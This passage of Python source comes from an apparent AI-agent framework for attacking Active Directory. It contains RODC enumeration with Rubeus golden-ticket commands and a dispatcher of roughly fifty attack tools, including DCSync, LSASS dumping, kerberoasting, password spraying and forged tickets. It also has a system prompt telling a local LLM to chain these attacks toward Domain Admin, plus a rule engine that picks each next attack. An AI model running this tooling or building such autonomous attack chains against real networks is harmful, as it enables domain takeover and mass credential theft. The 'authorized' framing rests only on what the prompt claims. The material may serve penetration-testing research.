            f"-cert-pfx '{pfx_file}' 2>&1",
            timeout=20
        )
        results.append(f"=== passthecert.py ===\n{pstc_out[:400]}")

    return "\n\n".join(results)


def tool_rodc_attack(dc_ip: str, domain: str, username: str,
                      password: str = "", nt_hash: str = "") -> str:
    """RODC (Read-Only Domain Controller) attacks:
    enumerate cached credentials, key list attack, RODC krbtgt abuse."""
    password = _real_secret(password)
    nt_hash  = _real_nt_hash(nt_hash)
    base_dn  = "DC=" + domain.replace(".", ",DC=")
    results  = []

    # Find RODCs
    auth_flag = (f"-x -H ldap://{dc_ip} -D '{username}@{domain}' -w '{password}'"
                 if password else f"-x -H ldap://{dc_ip}")
    rodc_out = _run(
        f"ldapsearch {auth_flag} -b '{base_dn}' "
        f"'(&(objectClass=computer)(primaryGroupID=521))' "
        f"sAMAccountName dNSHostName msDS-KrbTgtLinkBl 2>/dev/null | "
        f"grep -E 'sAMAccountName|dNSHostName|msDS-KrbTgt'",
        timeout=15
    )
    results.append(f"=== RODC Discovery ===\n{rodc_out[:600]}")

    # Enumerate Password Replication Policy
    prp_out = _run(
        f"ldapsearch {auth_flag} -b '{base_dn}' "
        f"'(&(objectClass=computer)(primaryGroupID=521))' "
        f"msDS-RevealedDSAs msDS-NeverRevealGroup msDS-RevealOnDemandGroup 2>/dev/null",
        timeout=15
    )
    results.append(f"=== Password Replication Policy ===\n{prp_out[:600]}")

    if "sAMAccountName" in rodc_out:
        add_finding("RODC Found", "Medium",
                    f"Read-Only DC detected — enumerate cached credentials and PRP",
                    "Restrict RODC PRP; audit msDS-RevealedList; monitor RODC replication")
        results.append(
            "=== RODC Exploitation Guide ===\n"
            "1. Check cached accounts: Get-ADObject -SearchBase <RODC_DN> -Filter * -Properties msDS-RevealedList\n"
            "2. Key List Attack (if you have RODC krbtgt hash):\n"
            "   Rubeus.exe golden /rodcNumber:<kvno> /flags:forwardable /nowrap /outfile:rodc.kirbi \\\n"
            "   /aes256:<rodc_aes_key> /user:Administrator /id:500 /domain:<domain>\n"
            "3. Then request for the real DC:\n"
            "   Rubeus.exe asktgs /service:krbtgt/<domain> /dc:<rodc_fqdn> /ticket:<rodc.kirbi>"
        )

    return "\n\n".join(results)[:4000]


# ══════════════════════════════════════════════════════════════════════════════
#  TOOL DISPATCHER
# ══════════════════════════════════════════════════════════════════════════════

TOOL_MAP = {
    "nmap_scan":                tool_nmap_scan,
    "enumerate_ldap":           tool_enumerate_ldap,
    "enumerate_shares":         tool_enumerate_shares,
    "collect_bloodhound":       tool_collect_bloodhound,
    "query_bloodhound_paths":   tool_query_bloodhound_paths,
    "asrep_roast":              tool_asrep_roast,
    "kerberoast":               tool_kerberoast,
    "password_spray":           tool_password_spray,
    "adcs_scan":                tool_adcs_scan,
    "shadow_credentials_attack":tool_shadow_credentials,
    "acl_abuse_scan":           tool_acl_abuse_scan,
    "force_change_password_pivot": tool_force_change_password_pivot,
    "logon_script_abuse":       tool_logon_script_abuse,
    "auto_loot_chain":          tool_auto_loot_chain,
    "dcsync_attack":            tool_dcsync,
    "lateral_movement":         tool_lateral_movement,
    "windows_privesc_recon":    tool_windows_privesc_recon,
    "credential_loot":          tool_credential_loot,
    "test_credential":          tool_test_credential,
    "discover_winrm_access":    tool_discover_winrm_access,
    "update_session":           tool_update_session,
    "run_module":               tool_run_module,
    "generate_report":          tool_generate_report,
    "chain_planner":            tool_chain_planner,
    # Kerberos / NTLM-disabled
    "request_tgt":              tool_request_tgt,
    "evil_winrm":               tool_evil_winrm,
    "kerbrute_enum":            tool_kerbrute_enum,
    "no_cred_surface_recon":    tool_no_cred_surface_recon,
    # AD object manipulation & advanced
    "bloodyad":                 tool_bloodyad,
    "gmsa_read":                tool_gmsa_read,
    "gmsa_takeover":            tool_gmsa_takeover,
    "jea_enum":                 tool_jea_enum,
    "targeted_kerberoast":      tool_targeted_kerberoast,
    # Advanced attack techniques
    "rbcd_attack":              tool_rbcd_attack,
    "coercion_attack":          tool_coercion_attack,
    "unconstrained_delegation": tool_unconstrained_delegation,
    "pre2k_attack":             tool_pre2k_attack,
    "timeroast":                tool_timeroast,
    # Credential & host attacks
    "credential_dump":          tool_credential_dump,
    "laps_read":                tool_laps_read,
    "mssql_abuse":              tool_mssql_abuse,
    "shadow_copies_dump":       tool_shadow_copies_dump,
    # Post-DA persistence
    "golden_ticket":            tool_golden_ticket,
    "silver_ticket":            tool_silver_ticket,
    # Domain escalation
    "trust_attack":             tool_trust_attack,
    "user_hunt":                tool_user_hunt,
    "gpo_abuse":                tool_gpo_abuse,
    "sccm_abuse":               tool_sccm_abuse,
    "adidns_abuse":             tool_adidns_abuse,
    "pass_the_cert":            tool_pass_the_cert,
    "rodc_attack":              tool_rodc_attack,
    "agent_complete":           lambda **kw: f"MISSION: {kw.get('status')} — {kw.get('summary')}",
}


def dispatch_tool(name: str, inputs: dict) -> str:
    fn = TOOL_MAP.get(name)
    if not fn:
        return f"Unknown tool: {name}"
    try:
        import inspect
        inputs = _sanitize_tool_inputs(name, inputs)
        sig = inspect.signature(fn)
        params = set(sig.parameters.keys())

        # Alias: AI sometimes uses target_ip instead of dc_ip (learned from nmap_scan)
        if "target_ip" in inputs and "dc_ip" in params and "target_ip" not in params:
            inputs["dc_ip"] = inputs.pop("target_ip")
        if "dc_ip" in inputs and "target_ip" in params and "dc_ip" not in params:
            inputs["target_ip"] = inputs.pop("dc_ip")

        # Strip any kwargs the function doesn't accept (prevents unexpected keyword errors)
        has_var_keyword = any(
            p.kind == inspect.Parameter.VAR_KEYWORD
            for p in sig.parameters.values()
        )
        if not has_var_keyword:
            inputs = {k: v for k, v in inputs.items() if k in params}

        missing = [
            pname for pname, param in sig.parameters.items()
            if param.default is inspect._empty
            and param.kind in (inspect.Parameter.POSITIONAL_OR_KEYWORD, inspect.Parameter.KEYWORD_ONLY)
            and pname not in inputs
        ]
        if missing:
            return (
                f"Tool skipped [{name}]: missing required input(s): {', '.join(missing)}. "
                "Run enumeration/BloodHound path query first or provide a concrete target."
            )

        return fn(**inputs)
    except Exception as e:
        import traceback
        return f"Tool error [{name}]: {e}\n{traceback.format_exc()[:500]}"


# ══════════════════════════════════════════════════════════════════════════════
#  AGENT DISPLAY HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _print_agent_header(round_num: int, tool_name: str):
    bar = AGENT_PINK + "─" * 72 + RST
    print(f"\n{bar}")
    print(f"  {AGENT_BLUE}{BOLD}[AGENT ROUND {round_num}]{RST}  "
          f"{AGENT_TEXT}Calling tool:{RST} {AGENT_PINK}{BOLD}{tool_name}{RST}")
    print(bar)


def _print_thinking(text: str):
    pass  # Agent reasoning hidden from display and report


def _print_tool_result(name: str, result: str):
    print(f"\n  {AGENT_PINK}{BOLD}◈ {AGENT_BLUE}TOOL RESULT{RST} {AGENT_PINK}[{name}]{RST}")
    for line in result.strip().splitlines()[:25]:
        print(f"  {AGENT_TEXT}{line}{RST}")
    if result.count("\n") > 25:
        print(f"  {AGENT_PINK}[...{result.count(chr(10))-25} more lines truncated]{RST}")


def _session_context() -> str:
    """Build current session state string for Claude."""
    owned_u = [u.get("user","?") for u in SESSION.get("owned_users", [])]
    owned_m = [m.get("machine","?") for m in SESSION.get("owned_machines", [])]
    loot = SESSION.get("loot", {})
    findings = len(SESSION.get("findings", []))
    intel = _agent_intel()
    return (
        f"TARGET: {SESSION.get('username','?')}@{SESSION.get('domain','?')} "
        f"→ {SESSION.get('dc_ip','?')}\n"
        f"AUTH: pw={bool(SESSION.get('password'))} hash={bool(SESSION.get('nt_hash'))} "
        f"krb={SESSION.get('use_kerberos',False)}\n"
        f"OWNED USERS: {owned_u}\n"
        f"OWNED MACHINES: {owned_m}\n"
        f"LOOT (hashes): {list(loot.keys())}\n"
        f"AGENT INTEL: esc={intel['esc_vulns'][:3]} acl={intel['acl_paths'][:3]} "
        f"spns={len(intel['spns'])} asrep={len(intel['asrep_users'])} "
        f"shares={intel['readable_shares'][:5]} ntlm_disabled={intel['ntlm_disabled']}\n"
        f"FINDINGS: {findings} tracked\n"
        f"COMMANDS RUN: {len(SESSION.get('commands_run',[]))}"
    )


# ══════════════════════════════════════════════════════════════════════════════
#  OLLAMA BACKEND — OpenAI-compatible tool calling
# ══════════════════════════════════════════════════════════════════════════════

def _build_ollama_system_prompt() -> str:
    """Balanced prompt for local models; tool schemas stay small separately."""
    return """You are an authorized Active Directory red team agent.
Mission: find the highest-impact path to Domain Admin and prove it with DCSync.

Rules:
- Always call exactly one available tool from the user's NEXT-ACTION MENU.
- Do not invent tool names. Do not answer with text only.
- Credentials are auto-injected by the framework; do not hardcode secrets.
- Read the latest tool result and choose the highest-impact next action.
- Do not repeat a completed or failed path unless the menu explicitly offers it.

Core reasoning after each result:
1. Extract concrete facts: users, hashes, SPNs, ESC IDs, ACL edges, shares, shells.
2. Prefer exploitation of a proven finding over more enumeration.
3. If a branch fails, pivot to the next candidate instead of retrying blindly.

Priority matrix:
- DA membership, DA hash, or replication rights -> dcsync_attack, then report.
- NT hash, valid credential, or ccache -> discover_winrm_access or evil_winrm.
- WinRM shell confirmed -> windows_privesc_recon, credential_loot, jea_enum.
- NTLM disabled, STATUS_NOT_SUPPORTED, or Protected Users -> request_tgt first.
- ADCS ESC finding -> adcs_scan(auto_exploit=True), then evil_winrm with ccache.
- SPN accounts -> kerberoast. Pre-auth disabled users -> asrep_roast. Crack offline.
- Readable shares -> auto_loot_chain to extract credentials.
- ACL GenericWrite/GenericAll/WriteDACL/WriteOwner on gMSA ($) -> gmsa_takeover.
- ForceChangePassword edge -> force_change_password_pivot.
- GenericWrite on a real computer object -> rbcd_attack or shadow_credentials_attack.
- GenericWrite on a user -> targeted_kerberoast or shadow_credentials_attack.
- Trust found -> trust_attack. Unconstrained delegation -> unconstrained_delegation.
- Legacy/old computers -> pre2k_attack and timeroast.
- MSSQLSvc or 1433 -> mssql abuse path.
- No clear exploit -> enumerate_ldap, enumerate_shares, acl_abuse_scan, BloodHound.

Target safety:
- RBCD is only for computer objects, not gMSA/service accounts.
- gMSA accounts use gmsa_takeover/gmsa_read, then pass-the-hash/WinRM.
- Do not attack the current user as the ACL target.

The rule engine supplies the valid menu. Pick one listed tool and call it."""


# Short system prompt — local models can't handle long prompts
OLLAMA_SYSTEM = _build_ollama_system_prompt()


def _compact_ollama_schema(schema: dict) -> dict:
    """Return a small JSON schema; local models choke on verbose tool specs."""
    if not isinstance(schema, dict):
        return {"type": "object", "properties": {}}
    compact = {"type": schema.get("type", "object")}
    props = schema.get("properties") or {}
    if isinstance(props, dict):
        compact_props = {}
        for key, value in props.items():
            if not isinstance(value, dict):
                compact_props[key] = {"type": "string"}
                continue
            item = {"type": value.get("type", "string")}
            if "enum" in value:
                item["enum"] = value["enum"]
            if "default" in value:
                item["default"] = value["default"]
            if item["type"] == "array":
                items = value.get("items") if isinstance(value.get("items"), dict) else {}
                item["items"] = {"type": items.get("type", "string")}
                if "enum" in items:
                    item["items"]["enum"] = items["enum"]
            compact_props[key] = item
        compact["properties"] = compact_props
    required = schema.get("required")
    if isinstance(required, list) and required:
        compact["required"] = required
    return compact


def _tool_to_ollama(tool: dict, compact: bool = False) -> dict:
    """Convert one Agent tool schema into Ollama's function-calling format."""
    desc = str(tool.get("description", ""))
    if compact:
        desc = desc.split(". ")[0].strip()
        if len(desc) > 180:
            desc = desc[:177].rstrip() + "..."
    return {
        "type": "function",
        "function": {
            "name": tool["name"],
            "description": desc,
            "parameters": (_compact_ollama_schema(tool["input_schema"])
                           if compact else tool["input_schema"]),
        }
    }


def _tools_to_ollama(tool_names: list[str] | None = None,
                     compact: bool = False) -> list[dict]:
    """Convert selected Agent tool schemas into Ollama's function-calling format."""
    selected = set(tool_names or [])
    tools = [t for t in TOOLS if not selected or t["name"] in selected]
    return [
        _tool_to_ollama(t, compact=compact)
        for t in tools
    ]


def _ollama_candidate_tools(completed_tools: list,
                            call_counts: dict = None,
                            max_tools: int = 4) -> list[tuple[str, dict]]:
    """Return a small next-action candidate set for Ollama.

    The rule engine remains the source of truth. Ollama only chooses among a
    tiny set of valid next actions instead of receiving every tool schema.
    """
    candidates: list[tuple[str, dict]] = []
    seen: set = set()
    exclude: set = set()
    schema_names = {t["name"] for t in TOOLS}
    for _ in range(max_tools):
        try:
            name, args = _pick_next_tool(
                completed_tools, exclude=exclude, call_counts=call_counts)
        except Exception:
            name, args = "", {}
        if not name or name in seen:
            break
        seen.add(name)
        exclude.add(name)
        if name in schema_names:
            candidates.append((name, args or {}))
    if not candidates:
        candidates.append(("agent_complete", {
            "status": "partial",
            "summary": "No valid next action was available",
        }))
    return candidates


def _ollama_candidate_reason(name: str) -> str:
    """Evidence-based one-line reason for why a candidate matters RIGHT NOW,
    derived from live session intel. Gives a small local model the 'why' so it
    can pick by impact instead of guessing. Target-agnostic: reads only state."""
    intel = _agent_intel()
    loot  = SESSION.get("loot", {}) or {}
    def _n(key):
        v = intel.get(key)
        return len(v) if isinstance(v, (list, dict)) else 0
    def _first(key):
        v = intel.get(key)
        return str(v[0])[:40] if isinstance(v, list) and v else ""
    reasons = {
        # ── Recon / enumeration ──────────────────────────────────────────────
        "nmap_scan":            "recon not done yet",
        "enumerate_ldap":       "AD not enumerated yet",
        "enumerate_shares":     "shares not enumerated yet",
        "no_cred_surface_recon":"no creds — map the unauthenticated attack surface",
        "kerbrute_enum":        "enumerate/validate domain usernames",
        "user_hunt":            "hunt logged-on users / privileged sessions",
        "collect_bloodhound":   "collect the AD graph for attack-path analysis",
        "query_bloodhound_paths":"query BloodHound for the shortest path to DA",
        "chain_planner":        "build a ranked multi-step attack plan",
        # ── Credential discovery / cracking ──────────────────────────────────
        "auto_loot_chain":      (f"{_n('readable_shares')} readable share(s) — hunt creds"
                                 if intel.get("readable_shares") else "mine shares for credentials"),
        "credential_loot":      "have a shell — hunt files/registry for secrets",
        "laps_read":            "LAPS may be readable — local admin password",
        "test_credential":      "validate a discovered credential before using it",
        "password_spray":       (f"{_n('users')} users enumerated — spray weak passwords"
                                 if intel.get("users") else "spray common passwords"),
        # ── Kerberos ─────────────────────────────────────────────────────────
        "kerberoast":           (f"{_n('spns')} SPN account(s) found — request & crack TGS"
                                 if intel.get("spns") else "request service tickets to crack"),
        "targeted_kerberoast":  "GenericWrite on a user — set an SPN then kerberoast",
        "asrep_roast":          (f"{_n('asrep_users')} AS-REP roastable user(s)"
                                 if intel.get("asrep_users") else "find pre-auth-disabled users"),
        "timeroast":            "MS-SNTP (timeroast) computer-account hash extraction",
        "request_tgt":          ("NTLM disabled — need a Kerberos TGT"
                                 if intel.get("ntlm_disabled") else "obtain a Kerberos TGT"),
        "golden_ticket":        "krbtgt hash obtained — forge a golden ticket",
        "silver_ticket":        "service-account hash — forge a silver ticket for one service",
        "pass_the_cert":        "a PFX certificate is available to authenticate (PKINIT/Schannel)",
        # ── ADCS / certificates ──────────────────────────────────────────────
        "adcs_scan":            (f"{_n('esc_vulns')} ESC finding(s) to exploit"
                                 if intel.get("esc_vulns") else "ADCS/CA present — check ESC1–ESC16 misconfig"),
        # ── ACL / object abuse ───────────────────────────────────────────────
        "acl_abuse_scan":       (f"{_n('acl_paths')} ACL abuse path(s) found"
                                 if intel.get("acl_paths") else "look for exploitable AD ACLs"),
        "bloodyad":             "abuse a writable AD object (generic primitive)",
        "force_change_password_pivot": "ForceChangePassword right on a target user — reset its password",
        "shadow_credentials_attack": "GenericWrite/AllExtendedRights — add msDS-KeyCredentialLink (PKINIT)",
        "rbcd_attack":          "GenericWrite on a COMPUTER object — resource-based constrained delegation",
        "gmsa_takeover":        (f"writable gMSA: {_first('gmsa_candidates')}"
                                 if intel.get("gmsa_candidates") else "writable gMSA membership — take it over"),
        "gmsa_read":            (f"{_n('gmsa_hashes')} gMSA hash(es) readable"
                                 if intel.get("gmsa_hashes") else "read a gMSA managed password"),
        "gpo_abuse":            "writable GPO — code execution on all linked OUs/hosts",
        "logon_script_abuse":   "writable SYSVOL scriptPath — plant a logon script",
        "adidns_abuse":         "AD-integrated DNS writable — add a record for relay/spoofing",
        # ── Delegation / trusts / DC ─────────────────────────────────────────
        "unconstrained_delegation": (f"{_n('delegation')} delegation finding(s) — coerce DC TGT"
                                 if intel.get("delegation") else "unconstrained delegation host — capture DC TGT"),
        "trust_attack":         "domain trust found — cross-domain / SID-history escalation",
        "rodc_attack":          "Read-Only DC — abuse cached creds / Password Replication Policy",
        # ── Shell / post-exploitation ────────────────────────────────────────
        "evil_winrm":           ("shell-ready credential available — get a shell"
                                 if (loot or intel.get("nt_hashes") or intel.get("ccaches")
                                     or intel.get("adcs_shell_ready")) else "attempt a WinRM shell"),
        "discover_winrm_access":"find which host this credential can WinRM into",
        "lateral_movement":     "pivot to another host with current creds",
        "windows_privesc_recon":"have a shell — local privilege-escalation recon",
        "jea_enum":             "have a shell — enumerate JEA-constrained endpoints",
        "credential_dump":      "have a shell — dump LSASS/SAM/LSA secrets",
        "shadow_copies_dump":   "have a shell — dump NTDS.dit via volume shadow copy",
        "dcsync_attack":        "replication rights — DCSync all domain hashes (krbtgt+admin)",
        # ── Service-specific / legacy ────────────────────────────────────────
        "mssql_abuse":          "MSSQL/1433 reachable — xp_cmdshell / linked-server RCE",
        "sccm_abuse":           "SCCM/MECM found — NAA creds / client-push relay",
        "pre2k_attack":         "legacy pre-Windows-2000 computer accounts — predictable passwords",
        "coercion_attack":      "coerce DC authentication (PetitPotam/printerbug) to capture/relay",
        # ── Utility ──────────────────────────────────────────────────────────
        "run_module":           "run a specific framework module directly",
        "update_session":       "update session state / injected credentials",
        "generate_report":      "compile findings into the final report",
        "agent_complete":       "no further high-impact action available",
    }
    return reasons.get(name, "next logical step in the kill chain")


# Map each agent tool to the SAST knowledge-base category that documents it, so
# the local model can be grounded in the real AD technique (title + MITRE) for
# each menu option without loading all 93 techniques into context.
_TOOL_SAST_CATEGORY = {
    "adcs_scan": "Cert Abuse", "pass_the_cert": "Cert Abuse",
    "kerberoast": "Kerberos Attacks", "targeted_kerberoast": "Kerberos Attacks",
    "asrep_roast": "Kerberos Attacks", "request_tgt": "Kerberos Attacks",
    "golden_ticket": "Kerberos Attacks", "silver_ticket": "Kerberos Attacks",
    "timeroast": "Kerberos Attacks",
    "acl_abuse_scan": "Acl Abuse", "bloodyad": "Acl Abuse",
    "force_change_password_pivot": "Acl Abuse",
    "shadow_credentials_attack": "Acl Abuse",
    "gmsa_takeover": "Acl Abuse", "gmsa_read": "Acl Abuse",
    "rbcd_attack": "Rbcd Attacks",
    "gpo_abuse": "Gpo Abuse", "logon_script_abuse": "Gpo Abuse",
    "coercion_attack": "Coercion Attacks",
    "credential_dump": "Credential Dump", "credential_loot": "Credential Dump",
    "shadow_copies_dump": "Credential Dump", "laps_read": "Credential Dump",
    "dcsync_attack": "Dcsync Dcshadow",
    "lateral_movement": "Lateral Movement", "evil_winrm": "Lateral Movement",
    "password_spray": "Password Attacks", "pre2k_attack": "Password Attacks",
    "trust_attack": "Trust Attacks",
}


# Exact tool → SAST technique-id mapping for precise grounding (preferred over
# the category/keyword fallback). Tools with no exact technique in the KB
# (gmsa_takeover, timeroast, …) are intentionally absent and fall back below.
_TOOL_SAST_TECHNIQUE = {
    "adcs_scan": "cert-esc1-001", "pass_the_cert": "cert-pkinit-001",
    "kerberoast": "kerberos-kerberoast-001", "targeted_kerberoast": "kerberos-kerberoast-001",
    "asrep_roast": "kerberos-asrep-roast-001", "request_tgt": "kerberos-ptt-001",
    "golden_ticket": "kerberos-golden-ticket-001", "silver_ticket": "kerberos-silver-ticket-001",
    "unconstrained_delegation": "kerberos-unconstrained-delegation-001",
    "acl_abuse_scan": "acl-bloodhound-001", "bloodyad": "acl-group-addmember-001",
    "force_change_password_pivot": "acl-forcechangepassword-001",
    "shadow_credentials_attack": "acl-shadow-credentials-001",
    "rbcd_attack": "rbcd-full-chain-001", "gpo_abuse": "gpo-scheduled-task-001",
    "coercion_attack": "coerce-coercer-001", "credential_dump": "credump-lsass-001",
    "laps_read": "credump-laps-001", "dcsync_attack": "dcsync-all-hashes-001",
    "lateral_movement": "lateral-psexec-001", "evil_winrm": "lateral-evil-winrm-001",
    "password_spray": "password-spray-001", "kerbrute_enum": "password-kerbrute-enum-001",
    "trust_attack": "trust-child-parent-001",
}
# Flat technique-id → technique index, built once from the loaded knowledge base.
_SAST_BY_ID = {t["id"]: t for techs in SAST_SKILLS.values() for t in techs}


def _sast_hint_for_tool(name: str) -> str:
    """Condensed SAST technique grounding for a tool: 'Title [MITRE, SEVERITY]'.
    Prefers an exact tool→technique mapping; otherwise matches the best technique
    in the tool's category by title keyword, else gives a category-level hint.
    Empty string if no mapping / knowledge base not loaded."""
    def _fmt(t: dict) -> str:
        mitre, sev = t.get("mitre", ""), t.get("severity", "")
        tag = f" [{mitre}{', ' + sev if sev else ''}]" if (mitre or sev) else ""
        return f"{t.get('title', '')}{tag}".strip()
    exact = _SAST_BY_ID.get(_TOOL_SAST_TECHNIQUE.get(name, ""))
    if exact:
        return _fmt(exact)
    cat = _TOOL_SAST_CATEGORY.get(name)
    techs = SAST_SKILLS.get(cat) if cat else None
    if not techs:
        return ""
    kws = [w for w in name.replace("_", " ").split() if len(w) > 3]
    best = next((t for t in techs
                 if any(kw in t.get("title", "").lower() for kw in kws)), None)
    if not best:
        return f"{cat} — {len(techs)} techniques in knowledge base"
    return _fmt(best)


def _ollama_candidate_menu(candidates: list[tuple[str, dict]]) -> str:
    lines = ["NEXT-ACTION MENU — pick the SINGLE highest-impact action:"]
    for idx, (name, args) in enumerate(candidates, start=1):
        command_hint = _command_preview_for_tool(name, args)[0]
        reason = _ollama_candidate_reason(name)
        lines.append(f"  {idx}. {name} — {reason}  (command≈{command_hint})")
        sast = _sast_hint_for_tool(name)
        if sast:
            lines.append(f"       ↳ technique: {sast}")
    lines.append("Decide which option has the highest impact given the evidence above, "
                 "then call exactly one listed tool.")
    return "\n".join(lines)


def _trim_ollama_messages(messages: list, max_tail: int = 8) -> list:
    """Keep local-model context small without losing the current state summary."""
    if len(messages) <= max_tail + 2:
        return messages
    head = messages[:2]
    tail = messages[2:][-max_tail:]
    while tail and tail[0].get("role") == "tool":
        tail = tail[1:]
    return head + tail


def _ollama_payload_size(messages: list, tools: list) -> int:
    try:
        return len(json.dumps({"messages": messages, "tools": tools}, default=str))
    except Exception:
        return 0


def _tools_to_ollama_legacy() -> list[dict]:
    """Convert all Agent tool schemas for backends that can handle full payloads."""
    return [
        {
            "type": "function",
            "function": {
                "name": t["name"],
                "description": t["description"],
                "parameters": t["input_schema"],
            }
        }
        for t in TOOLS
    ]


def _parse_json_tool_call(content: str):
    """
    Multi-format fallback parser for models that embed tool calls in text.
    Handles: JSON, markdown code blocks, Python call syntax.
    """
    if not content:
        return None
    # 1. Pure JSON object
    try:
        d = json.loads(content.strip())
        if isinstance(d, dict) and "name" in d:
            return d["name"], d.get("arguments", d.get("parameters", {}))
    except Exception:
        pass
    # 2. JSON inside markdown code block
    m = re.search(r'```(?:json)?\s*(\{.*?\})\s*```', content, re.S)
    if m:
        try:
            d = json.loads(m.group(1))
            if "name" in d:
                return d["name"], d.get("arguments", {})
        except Exception:
            pass
    # 3. JSON object anywhere in text
    m = re.search(r'\{[^{}]*"name"\s*:\s*"(\w+)"[^{}]*\}', content, re.S)
    if m:
        try:
            d = json.loads(m.group(0))
            return d["name"], d.get("arguments", {})
        except Exception:
            pass
    # 4a. Python call with JSON object arg: tool_name({"key": "val", ...})
    m = re.search(r'\b(\w+)\s*\(\s*(\{.*?\})\s*\)', content, re.S)
    if m:
        fname = m.group(1)
        if fname in TOOL_MAP:
            try:
                args = json.loads(m.group(2))
                return fname, args
            except Exception:
                pass
    # 4b. Python call syntax: tool_name(key="val", ...)
    m = re.search(r'\b(\w+)\(([^)]*)\)', content)
    if m:
        fname = m.group(1)
        if fname in TOOL_MAP:
            raw_args = m.group(2)
            args = {}
            for kv_m in re.finditer(r'(\w+)\s*=\s*["\']?([^,"\')\s]+)["\']?', raw_args):
                args[kv_m.group(1)] = kv_m.group(2)
            if args:
                return fname, args
    return None


def _pfx_cert_domain(pfx_path: str) -> str:
    """Return the AD domain (lowercase) embedded in a PFX's UPN/SAN, or '' if it
    cannot be determined. Used to avoid picking up a leftover certificate from a
    PREVIOUS engagement (different box/domain) when the agent globs *.pfx in the
    CWD — that would feed pass_the_cert a foreign cert and fail with
    KDC_ERR_C_PRINCIPAL_UNKNOWN. Target-agnostic: reads the cert, never hardcoded."""
    try:
        from cryptography.hazmat.primitives.serialization import pkcs12
        from cryptography import x509
        data = Path(pfx_path).read_bytes()
        cert = None
        for pw in (None, b""):
            try:
                _, cert, _ = pkcs12.load_key_and_certificates(data, pw)
                break
            except Exception:
                cert = None
        if cert is None:
            return ""
        try:
            san = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value
            for name in san:
                val = getattr(name, "value", None)
                blob = bytes(val) if isinstance(val, (bytes, bytearray)) else str(val).encode()
                m = re.search(rb"@([A-Za-z0-9.\-]+\.[A-Za-z]{2,})", blob)
                if m:
                    return m.group(1).decode(errors="ignore").lower()
        except Exception:
            pass
        try:
            dcs = [a.value for a in cert.subject if a.oid == x509.NameOID.DOMAIN_COMPONENT]
            if dcs:
                return ".".join(dcs).lower()
        except Exception:
            pass
        return ""
    except Exception:
        return ""


def _pick_next_tool(completed_tools: list,
                    exclude: set = None,
                    call_counts: dict = None) -> tuple:
    """
    Adaptive kill chain — decisions based on what was ACTUALLY FOUND,
    not a fixed script. Works for any AD machine regardless of auth method.

    `exclude`: set of tool names that the caller has already determined to be
    dead-ends in the current round; never propose them.
    `call_counts`: dict mapping tool_name -> total invocations across the
    session (NOT deduped). Used to decide whether a "retry up to 2x" branch
    has been exhausted. completed_tools is dedup'd so its .count() can never
    exceed 1, which is why we need a real counter.
    """
    exclude = set(exclude or ())
    call_counts = call_counts or {}
    def _calls(name: str) -> int:
        return int(call_counts.get(name, 0))
    def _done(name: str) -> bool:
        return name in completed_tools or name in exclude
    def _enum_attempted() -> bool:
        return any(name in completed_tools for name in (
            "enumerate_ldap", "enumerate_shares", "collect_bloodhound",
            "acl_abuse_scan", "adcs_scan",
        ))

    dc    = SESSION.get("dc_ip", "")
    dom   = SESSION.get("domain", "")
    u     = SESSION.get("username", "")
    p     = _real_secret(SESSION.get("password", ""))
    h     = _real_nt_hash(SESSION.get("nt_hash", ""))
    krb   = SESSION.get("use_kerberos", False)
    cc    = SESSION.get("krb5_ccache", "")
    owned = SESSION.get("owned_machines", [])
    loot  = {k: v for k, v in SESSION.get("loot", {}).items() if _real_nt_hash(v)}
    ntlm_off = SESSION.get("ntlm_disabled", False)
    intel = _agent_intel()
    # Dead-path tracking — discover_winrm_access / evil_winrm proven useless
    # for the current principal. Skip every WinRM branch instead of looping.
    winrm_dead_users = set(SESSION.get("winrm_dead_for", []) or [])
    network_dead     = bool(SESSION.get("network_unreachable", False))
    gmsa_read_dead_users = list(intel.get("gmsa_read_dead_for", []) or [])
    gmsa_read_dead = any(_same_ad_account(u, dead) for dead in gmsa_read_dead_users)
    acl_scan_dead_users = list(intel.get("acl_scan_dead_for", []) or [])
    acl_scan_dead = any(_same_ad_account(u, dead) for dead in acl_scan_dead_users)

    creds = {"dc_ip": dc, "domain": dom, "username": u, "password": p, "nt_hash": h}
    krbtgt_hash = _real_nt_hash(SESSION.get("loot", {}).get("krbtgt", "") or
                                intel.get("krbtgt_hash", ""))
    _esc_found = bool(intel["esc_vulns"]) or any(
        "ESC" in str(f.get("name", "")) for f in SESSION.get("findings", [])
    )

    # ── Priority -1: Post-DCSync golden ticket ───────────────────────────────
    if krbtgt_hash and not _done("golden_ticket"):
        return "golden_ticket", {**creds, "krbtgt_hash": krbtgt_hash}

    # ── Priority -1b: PassTheCert when PFX available but no NT hash yet ──────
    # Only trigger if certipy auth ccache/hash was NOT already obtained.
    pfx_candidates = list(Path(".").glob("*.pfx"))
    # Domain-scope leftover PFX files: a cert from a previous engagement must
    # not be fed to pass_the_cert for the active target.
    _dom_l = (dom or "").lower()
    if pfx_candidates and _dom_l:
        # Loose PFX files in the repo root may be leftovers from a previous
        # target. Auto-use only certs that identify the active domain, or an
        # unparseable cert whose filename matches the current principal.
        _user_stem = (u or "").split("@")[0].split("\\")[-1].lower()
        scoped = []
        for p in pfx_candidates:
            cert_domain = _pfx_cert_domain(str(p))
            if cert_domain == _dom_l or (not cert_domain and p.stem.lower() == _user_stem):
                scoped.append(p)
        pfx_candidates = scoped
    if (pfx_candidates and _done("nmap_scan") and _done("enumerate_ldap")
            and not _done("pass_the_cert") and not intel.get("ccaches")):
        pfx = str(pfx_candidates[0])
        # Cert owner = full PFX stem (e.g. "alice.pfx" → "alice")
        cert_owner = pfx_candidates[0].stem or u
        return "pass_the_cert", {**creds, "pfx_file": pfx, "target_user": cert_owner,
                                  "pfx_pass": ""}

    # ── Priority 0a: Fresh gMSA hash never tried with WinRM ──────────────────
    # gMSA accounts are often members of
    # BUILTIN\Remote Management Users — that's the whole point of taking them
    # over. Run evil_winrm immediately, before any other exhausted-path logic
    # can short-circuit the chain. We bypass winrm_dead_users (the gMSA itself
    # has never been tried) and ignore _done("evil_winrm") because previous
    # WinRM attempts were against a DIFFERENT principal.
    fresh_gmsa_hash = {}
    attempted_winrm = set(SESSION.get("winrm_attempted_for", []) or [])
    for acct, gh in (intel.get("gmsa_hashes") or {}).items():
        nth = _real_nt_hash(gh)
        if not nth:
            continue
        acct_s = str(acct)
        if acct_s in winrm_dead_users or acct_s in attempted_winrm:
            continue
        fresh_gmsa_hash[acct_s] = nth
    if fresh_gmsa_hash:
        acct, nth = next(iter(fresh_gmsa_hash.items()))
        SESSION.setdefault("winrm_attempted_for", []).append(acct)
        return "evil_winrm", {
